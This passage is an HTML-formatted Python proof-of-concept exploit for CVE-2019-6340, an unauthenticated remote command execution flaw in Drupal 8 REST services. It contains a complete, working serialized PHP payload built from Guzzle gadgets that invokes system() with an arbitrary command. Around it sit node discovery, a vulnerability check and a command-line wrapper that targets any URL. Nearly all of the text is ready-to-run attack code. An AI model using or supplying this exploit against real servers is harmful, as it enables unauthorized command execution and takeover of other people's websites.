&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;body&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;u = build_url(base, &#39;/node/&#39;, str(node_id))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(f&#39;{u}?_format=hal_json&#39;, json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if check_drupal_cache(r):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;Checking if node {node_id} is vuln returned cache HIT, ignoring&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;INVALID_VALUE does not correspond to an entity on this site&#39; in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def exploit(base: str, node_id: int, cmd: str):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exploit using the Guzzle Gadgets</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# pad a easy search replace output:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cmd = &#39;echo ---- &amp; &#39; + cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;link&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;link&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;options&quot;: &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\u0000&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:{s:5:\&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;close\&quot;;a:2:{i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;{s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;s:|size|:\&quot;|command|\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;stack\&quot;;a:1:{i:0;a:1:{i:0;s:6:\&quot;system\&quot;;}}s:31:\&quot;\u0000&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;}i:1;s:7:\&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;resolve\&quot;;}}s:9:\&quot;_fn_close\&quot;;a:2:{i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;}}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;.replace(&#39;|size|&#39;, str(len(cmd))).replace(&#39;|command|&#39;, cmd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;_links&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;href&quot;: f&quot;{urljoin(base, &#39;/rest/type/shortcut/default&#39;)}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;u = build_url(base, &#39;/node/&#39;, str(node_id))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(f&#39;{u}?_format=hal_json&#39;, json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if check_drupal_cache(r):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;Exploiting {node_id} returned cache HIT, may have failed&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;----&#39; not in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[warn] Command execution _may_ have failed&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(r.text.split(&#39;----&#39;)[1])</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main(base: str, cmd: str):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Execute an OS command!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[+] Finding a usable node id...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;article = find_article(base)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not article:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Unable to find a node ID to reference. Check manually?&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(f&#39;[+] Using node_id {article}&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;vuln = check(base, article)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not vuln:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Target does not appear to be vulnerable.&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] It may also simply be a caching issue, so maybe just try again later.&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(f&#39;[+] Target appears to be vulnerable!&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit(base, article, cmd)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39; by @leonjza\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;References:\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39; https://www.drupal.org/sa-core-2019-003\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39; https://www.ambionics.io/blog/drupal8-rce\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[warning] Caching heavily affects reliability of this exploit.\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Nodes are used as they are discovered, but once they are done,\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;you will have to wait for cache expiry.\n&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) &lt;= 2:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;Usage: {sys.argv[0]} &lt;target base URL&gt; &lt;command&gt;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39; &nbsp;&nbsp;&nbsp;Example: {sys.argv[0]} http://127.0.0.1/ id&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;target = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;command = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not uri_valid(target):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;Target {target} is not a valid URL&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(f&#39;Targeting {target}...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;main(target, command)</span></p></body>
</html>
